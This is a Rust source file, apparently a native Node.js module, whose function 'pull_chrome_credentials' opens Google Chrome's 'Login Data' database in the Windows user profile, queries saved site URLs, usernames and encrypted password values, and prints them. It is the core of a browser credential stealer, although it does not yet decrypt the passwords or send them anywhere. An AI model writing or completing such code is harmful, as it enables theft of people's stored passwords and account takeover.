use std::path::PathBuf;

use neon::prelude::*;

use dirs::home_dir;

use rusqlite::{Connection, OpenFlags, Result};

use crate::error::{ExtractorResult, ExtractorError};

pub fn stub(mut cx: FunctionContext) -> JsResult<JsUndefined> {
    pull_chrome_credentials().unwrap();

    Ok(cx.undefined())
}

pub fn pull_chrome_credentials() -> ExtractorResult<()> {
    // TODO: Check for Canary, Beta, Dev, etc.
    let login_data_path = home_dir()
        .ok_or(ExtractorError::CannotFindHomeDirectory)?
        .join(["AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"].iter().collect::<PathBuf>());

    let conn = Connection::open_with_flags(&login_data_path, OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX)?;

    let mut stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins LIMIT 10")?;

    let mut res = stmt.query([])?;

    println!("{:?}", login_data_path);

    while let Some(row) = res.next()? {
        let s: Vec<u8> = row.get(2)?;

        println!("data: {:?}", s);
    }

    Ok(())
}
